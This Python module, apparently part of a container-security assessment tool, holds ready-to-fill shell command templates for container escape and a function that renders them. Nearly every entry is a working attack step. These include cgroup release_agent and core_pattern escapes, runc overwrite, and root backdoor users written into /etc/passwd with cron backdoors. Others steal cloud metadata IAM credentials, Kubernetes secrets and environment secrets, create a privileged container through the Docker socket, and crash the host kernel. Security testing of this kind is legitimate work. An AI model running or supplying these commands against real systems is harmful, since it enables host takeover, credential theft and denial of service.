"""PoC command templates for escape techniques."""

from __future__ import annotations


class SafeFormatDict(dict):
    """Dict that returns '{key}' for missing keys during str.format_map()."""

    def __missing__(self, key: str) -> str:
        return "{" + key + "}"


POC_TEMPLATES: dict[str, str] = {
    # ── CAPABILITY ────────────────────────────────────────────────
    "cap_sys_admin_mount": (
        "mkdir -p /mnt/host && mount /dev/{host_device} /mnt/host"
    ),
    "cap_sys_admin_cgroup_escape": (
        "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && "
        "mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && "
        "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) && "
        "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && "
        "echo '#!/bin/sh' > /cmd && echo '{payload_command}' >> /cmd && "
        "chmod a+x /cmd && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
    ),
    "cap_sys_admin_bpf": (
        "# Load eBPF program to read kernel memory\n"
        "bpftool prog load /tmp/exploit.o /sys/fs/bpf/pwn type tracepoint"
    ),
    "cap_sys_ptrace": (
        "# Attach to host PID 1 and inject shellcode\n"
        "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"
    ),
    "cap_dac_read_search": (
        "# Read host /etc/shadow bypassing permission checks\n"
        "cat /etc/shadow  # DAC_READ_SEARCH bypasses read permission checks"
    ),
    "cap_dac_override": (
        "# Write to host files bypassing permission checks\n"
        "echo '{backdoor_user}:x:0:0::/root:/bin/bash' >> /host/etc/passwd"
    ),
    "cap_net_admin": (
        "# Manipulate network routing to intercept traffic\n"
        "ip route add {target_network} via {gateway} dev eth0"
    ),
    "cap_sys_rawio": (
        "# Direct disk read via raw I/O\n"
        "dd if=/dev/{host_device} of=/tmp/disk_dump bs=512 count=1024"
    ),
    # ── MOUNT ─────────────────────────────────────────────────────
    "docker_socket_mount": (
        "curl -s --unix-socket /var/run/docker.sock "
        "http://localhost/containers/json"
    ),
    "procfs_core_pattern": (
        "echo '|/tmp/payload.sh' > /proc/sys/kernel/core_pattern && "
        "echo '{payload_command}' > /tmp/payload.sh && "
        "chmod +x /tmp/payload.sh && "
        "sleep 1 && kill -SEGV $$"
    ),
    "procfs_sysrq": (
        "# Trigger host kernel crash (DANGEROUS)\n"
        "echo c > /proc/sysrq-trigger"
    ),
    "sysfs_hugepages": (
        "# Write to sysfs kernel parameters\n"
        "echo {value} > /sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages"
    ),
    "hostpath_mount_etc": (
        "# Backdoor host via writable /etc\n"
        "echo '{backdoor_user}:x:0:0::/root:/bin/bash' >> /host/etc/passwd && "
        "echo '{cron_payload}' > /host/etc/cron.d/backdoor"
    ),
    "hostpath_mount_root": (
        "# Full host filesystem access\n"
        "chroot /host /bin/bash"
    ),
    "cgroupfs_escape": (
        "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && "
        "mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && "
        "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) && "
        "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && "
        "echo '#!/bin/sh' > /cmd && echo '{payload_command}' >> /cmd && "
        "chmod a+x /cmd && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
    ),
    "devfs_access": (
        "# Mount host disk from /dev\n"
        "mkdir -p /mnt/host && mount /dev/{host_device} /mnt/host && "
        "ls /mnt/host"
    ),
    "containerd_sock_mount": (
        "# Access containerd via mounted socket\n"
        "ctr -a /run/containerd/containerd.sock containers list"
    ),
    "crio_sock_mount": (
        "# Access CRI-O via mounted socket\n"
        "crictl --runtime-endpoint unix:///var/run/crio/crio.sock pods"
    ),
    "systemd_cgroup_injection": (
        "# Inject systemd unit via writable cgroup v1\n"
        "mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && "
        "echo 1 > /tmp/cgrp/cgroup.clone_children && "
        "mkdir /tmp/cgrp/x && echo $$ > /tmp/cgrp/x/cgroup.procs && "
        "echo '{payload_command}' > /tmp/cgrp/x/notify_on_release"
    ),
    "tmpfs_shm_cross_container": (
        "# Write to shared /dev/shm for cross-container exfil\n"
        "echo 'exfil_data' > /dev/shm/shared_payload && "
        "ls -la /dev/shm/"
    ),
    "proc_fd_symlink_traversal": (
        "# Traverse /proc/self/fd symlinks to access host files\n"
        "ls -la /proc/self/fd/ && "
        "readlink /proc/self/fd/*"
    ),
    "device_mapper_access": (
        "# Access device-mapper to manipulate block devices\n"
        "dmsetup ls && dmsetup info"
    ),
    "vm_param_manipulation": (
        "# Manipulate VM parameters to affect host memory management\n"
        "echo 1 > /proc/sys/vm/drop_caches && "
        "cat /proc/sys/vm/overcommit_memory"
    ),
    # ── KERNEL ────────────────────────────────────────────────────
    "cve_2022_0185": (
        "# CVE-2022-0185 — FSConfig heap overflow\n"
        "# Compile and run exploit for kernel {kernel_version}\n"
        "unshare -Urm -- /tmp/cve_2022_0185"
    ),
    "cve_2022_0847": (
        "# DirtyPipe — compile and run exploit for kernel {kernel_version}\n"
        "/tmp/dirtypipe /etc/passwd 1 \"\\n{backdoor_user}:x:0:0::/root:/bin/sh\""
    ),
    "cve_2021_22555": (
        "# CVE-2021-22555 — Netfilter setsockopt heap OOB write\n"
        "# Compile exploit for kernel {kernel_version}\n"
        "/tmp/cve_2021_22555"
    ),
    "cve_2022_2588": (
        "# CVE-2022-2588 — route4 use-after-free\n"
        "# Compile exploit for kernel {kernel_version}\n"
        "/tmp/cve_2022_2588"
    ),
    "cve_2023_0386": (
        "# CVE-2023-0386 — OverlayFS privilege escalation\n"
        "# Requires user namespace support\n"
        "unshare -Urm -- /tmp/cve_2023_0386"
    ),
    "cve_2023_32233": (
        "# CVE-2023-32233 — nf_tables use-after-free\n"
        "/tmp/cve_2023_32233"
    ),
    "cve_2024_1086": (
        "# CVE-2024-1086 — nf_tables double-free\n"
        "/tmp/cve_2024_1086"
    ),
    "cve_2021_31440": (
        "# CVE-2021-31440 — eBPF verifier bypass\n"
        "bpftool prog load /tmp/cve_2021_31440.o /sys/fs/bpf/pwn"
    ),
    "cve_2022_23222": (
        "# CVE-2022-23222 — eBPF type confusion\n"
        "/tmp/cve_2022_23222"
    ),
    "cve_2024_21626": (
        "# CVE-2024-21626 — runc process.cwd breakout\n"
        "# Exploit leaked fd to access host filesystem via /proc/self/fd/{leaked_fd}"
    ),
    "ebpf_probe_write_user": (
        "# Use bpf_probe_write_user to write to host process memory\n"
        "bpftool prog load /tmp/probe_write.o /sys/fs/bpf/pwn type tracepoint"
    ),
    "cve_2024_53104": (
        "# CVE-2024-53104 — USB Video Class OOB write\n"
        "# Requires USB device access for exploitation\n"
        "/tmp/cve_2024_53104"
    ),
    "cve_2025_21756": (
        "# CVE-2025-21756 — vsock use-after-free\n"
        "/tmp/cve_2025_21756"
    ),
    "lsm_apparmor_unconfined": (
        "# AppArmor is unconfined — no MAC restrictions\n"
        "cat /proc/self/attr/current  # Should show 'unconfined'"
    ),
    "lsm_selinux_unconfined": (
        "# SELinux is disabled/unconfined — no MAC restrictions\n"
        "cat /proc/self/attr/current  # Check SELinux context"
    ),
    # ── RUNTIME ───────────────────────────────────────────────────
    "k8s_service_account": (
        "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && "
        "curl -sk -H \"Authorization: Bearer $TOKEN\" "
        "https://kubernetes.default.svc/api/v1/namespaces"
    ),
    "k8s_kubelet_api": (
        "curl -sk https://{node_ip}:10250/pods"
    ),
    "k8s_etcd_access": (
        "curl -sk https://{etcd_host}:2379/v3/kv/range "
        "-d '{{\"key\": \"L3JlZ2lzdHJ5\"}}'"
    ),
    "docker_api_unauth": (
        "curl -s --unix-socket /var/run/docker.sock "
        "http://localhost/images/json"
    ),
    "containerd_shim_escape": (
        "# Exploit containerd-shim abstract unix socket\n"
        "# Connect to @/containerd-shim/{namespace}/{container_id}/shim.sock"
    ),
    "runc_cve_2019_5736": (
        "# CVE-2019-5736 — overwrite host runc via /proc/self/exe\n"
        "#!/bin/bash\n"
        "exec 3</proc/self/exe && "
        "while ! echo '{payload_command}' > /proc/self/exe 2>/dev/null; do "
        "sleep 0.1; done"
    ),
    "cloud_metadata_ssrf": (
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    ),
    "k8s_node_proxy": (
        "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && "
        "curl -sk -H \"Authorization: Bearer $TOKEN\" "
        "https://kubernetes.default.svc/api/v1/nodes/{node_name}/proxy/pods"
    ),
    # ── COMBINATORIAL ─────────────────────────────────────────────
    "cap_sys_admin_no_seccomp": (
        "# Multiple escape paths: mount, cgroup, BPF\n"
        "mkdir -p /mnt/host && mount /dev/{host_device} /mnt/host"
    ),
    "privileged_docker_sock": (
        "# Trivial escape: create privileged container with host mounts\n"
        "curl -s --unix-socket /var/run/docker.sock -X POST "
        "-H 'Content-Type: application/json' "
        "-d '{{\"Image\":\"{escape_image}\",\"Cmd\":[\"/bin/sh\"],"
        "\"Privileged\":true,\"HostConfig\":{{\"Binds\":[\"/:/host\"]}}}}' "
        "http://localhost/containers/create"
    ),
    "cap_net_raw_metadata": (
        "# ARP spoof to intercept metadata credentials\n"
        "arpspoof -i eth0 -t {target_ip} 169.254.169.254 &\n"
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    ),
    "writable_proc_privileged": (
        "echo '|/tmp/payload.sh' > /proc/sys/kernel/core_pattern && "
        "echo '#!/bin/sh' > /tmp/payload.sh && "
        "echo '{payload_command}' >> /tmp/payload.sh && "
        "chmod +x /tmp/payload.sh && "
        "kill -SEGV $$"
    ),
    "user_ns_kernel_exploit": (
        "# User namespace + kernel exploit chain\n"
        "unshare -Urm -- /tmp/kernel_exploit"
    ),
    "cap_sys_admin_apparmor_unconfined": (
        "# SYS_ADMIN without AppArmor — full kernel feature access\n"
        "mkdir -p /mnt/host && mount /dev/{host_device} /mnt/host"
    ),
    # ── INFO_DISCLOSURE ───────────────────────────────────────────
    "env_secret_leak": (
        "env | grep -iE '(key|secret|token|password|api|credential|auth)'"
    ),
    "cloud_metadata_creds": (
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && "
        "ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) && "
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
    ),
    "k8s_configmap_secrets": (
        "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && "
        "curl -sk -H \"Authorization: Bearer $TOKEN\" "
        "https://kubernetes.default.svc/api/v1/namespaces/{namespace}/secrets"
    ),
    "docker_env_inspection": (
        "curl -s --unix-socket /var/run/docker.sock "
        "http://localhost/containers/{container_id}/json | "
        "python3 -c \"import sys,json; "
        "print('\\n'.join(json.load(sys.stdin)['Config']['Env']))\""
    ),
}


def render_poc(technique_id: str, posture_data: dict | None = None) -> str:
    """Render a PoC template with posture data.

    Missing keys in posture_data are left as {placeholder} in the output.
    Returns empty string if no template exists for the technique.
    """
    template = POC_TEMPLATES.get(technique_id)
    if template is None:
        return ""
    if posture_data is None:
        posture_data = {}
    return template.format_map(SafeFormatDict(posture_data))
